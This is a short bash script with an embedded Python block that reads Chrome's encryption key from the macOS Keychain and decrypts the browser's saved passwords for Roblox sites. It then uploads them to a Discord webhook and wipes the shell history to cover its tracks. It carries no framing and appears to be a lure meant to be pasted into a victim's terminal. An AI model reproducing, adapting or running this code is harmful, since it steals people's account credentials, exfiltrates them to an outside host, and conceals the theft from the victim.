
pip3 install pycryptodome

# Run Python script and capture its output
python_output=$(python3 - <<'PYTHON'
import subprocess, sqlite3, shutil, tempfile, os, hashlib
from Crypto.Cipher import AES

db = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data')
key = subprocess.run(
    ['security','find-generic-password','-w','-a','Chrome','-s','Chrome Safe Storage'],
    capture_output=True, text=True
).stdout.strip()

dk = hashlib.pbkdf2_hmac('sha1', key.encode(), b'saltysalt', 1003, dklen=16)

tmp = tempfile.mktemp(suffix='.db')
shutil.copy2(db, tmp)

conn = sqlite3.connect(tmp)
cur = conn.cursor()
for origin_url, username, password_enc in cur.execute(
    "SELECT origin_url, username_value, password_value FROM logins WHERE origin_url LIKE '%roblox%'"
):
    iv = b' ' * 16
    cipher = AES.new(dk, AES.MODE_CBC, IV=iv)
    decrypted = cipher.decrypt(password_enc[3:])
    pad_len = decrypted[-1]
    password = decrypted[:-pad_len].decode(errors='replace')
    print(f'User: {username}  Pass: {password}')

os.unlink(tmp)
PYTHON
)

# Send the captured output to Discord via webhook
echo "$python_output" | curl -s -F "file=@-;filename=output.txt" \
-F 'payload_json={"content":"📜 **Terminal Output**"}' \
"https://discord.com/api/webhooks/1515854250385870910/BX921sqtZR-5TqkwVZ997azfOBV_auXxUEmTb8yZ2v97IIEzkqHww-OY_Q3V4eGOk1_g" && clear; : > ~/.zsh_history && exec $SHELL
